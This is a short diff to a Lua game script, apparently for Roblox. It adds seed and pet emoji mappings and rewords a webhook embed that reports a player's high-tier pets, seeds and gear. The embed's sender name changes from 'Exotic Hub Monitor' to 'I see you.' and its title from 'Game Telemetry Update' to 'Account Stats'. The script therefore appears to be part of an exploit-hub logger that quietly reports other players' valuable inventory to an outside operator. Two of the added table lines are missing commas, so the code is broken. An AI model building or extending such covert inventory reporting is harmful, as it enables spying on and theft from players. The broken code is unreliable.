@@ -3198,13 +3198,20 @@ E.GameApi = {
 				["Gold Seed"] = "<:GoldSeed:1517928796949577908>",
 				["Gold"] = "<:GoldSeed:1517928796949577908>",
 				["Rainbow Seed"] = "<:RainbowSeed:1517928781455560714>",
-				["Rainbow"] = "<:RainbowSeed:1517928781455560714>"
+				["Rainbow"] = "<:RainbowSeed:1517928781455560714>",
+				["Mega Seed"] = "<:MegaSeed:1524387446803009658>",
+				["Mega"] = "<:MegaSeed:1524387446803009658>",
+				["Venom Spitter"] = "<:VenomSpitterSeed:1524393516032331887>"
+				["Venus Fly Trap"] = "<:VenusFlyTrapSeed:1524393484285382729>"
+				["Ghost Pepper"] = "<:GhostPepperSeed:1524393591676473435>",
+				["Poison Apple"] = "<:PoisonAppleSeed:1524393566829547590>",
+				["Pomegranate"] = "<:PomegranateSeed:1524393543764934736>"
 			}
 
 			-- Custom Pet Emoji Mapping Table (including Unicorn, Dragonfly, Raccoon, Ice Serpent, Black Dragon, Bear, and Bald Eagle)
 			local PetEmojis = {
 				["Unicorn"] = "<:1515268308633391207:1520052828268269621>",
-				["Dragonfly"] = "<:1515424090532610180:1515758935867654204>",
+				["Golden Dragonfly"] = "<:1515424090532610180:1515758935867654204>",
 				["Raccoon"] = "<:raccoon:1373885770774876224>",
 				["Ice Serpent"] = "<:iceserpent:1524382567099269294>",
 				["Black Dragon"] = "<:blackdragon:1524382547532972246>",
@@ -3350,22 +3357,22 @@ E.GameApi = {
 			-- Add sections as fields dynamically (only shows up if there is at least one match)
 			local fields = {}
 			if petsStr then
-				table.insert(fields, { name = Emojis.Pets .. " High-Tier Pets In Inventory", value = petsStr, inline = false })
+				table.insert(fields, { name = Emojis.Pets .. "Pets In Inventory", value = petsStr, inline = false })
 			end
 			if seedsStr then
-				table.insert(fields, { name = Emojis.Seeds .. " High-Tier Seeds In Inventory", value = seedsStr, inline = false })
+				table.insert(fields, { name = Emojis.Seeds .. "Seeds In Inventory", value = seedsStr, inline = false })
 			end
 			if gearStr then
-				table.insert(fields, { name = Emojis.Gear .. " High-Tier Gear & Tools", value = gearStr, inline = false })
+				table.insert(fields, { name = Emojis.Gear .. "Gear & Tools", value = gearStr, inline = false })
 			end
 
 			return {
-				username = "Exotic Hub Monitor",
+				username = "I see you.",
 				embeds = {
 					{
-						title = Emojis.Title .. " Game Telemetry Update",
+						title = Emojis.Title .. "Account Stats",
 						description = description,
-						color = 3092790, -- Dark Theme
+						color = 3092790,
 						fields = fields,
 						timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
 					}
